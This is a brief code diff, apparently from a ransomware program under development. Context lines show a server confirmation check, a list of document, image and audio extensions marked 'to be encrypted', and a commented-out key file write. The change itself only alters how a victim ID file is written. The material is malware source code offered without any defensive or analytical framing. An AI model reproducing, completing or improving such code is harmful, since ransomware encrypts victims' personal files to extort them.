@@ -39,7 +39,7 @@ if recvmessage != b'confirmed':
 #extensions to be encrypted
 extensions = ["pdf", "txt", "mp3", "jpg", "pptx", "docx"]
 
-with open("id.id", "x") as f:
+with open("id.id", "w") as f:
     f.write(str(sendID))
     f.close()
 #with open('not.key', 'wb') as f:
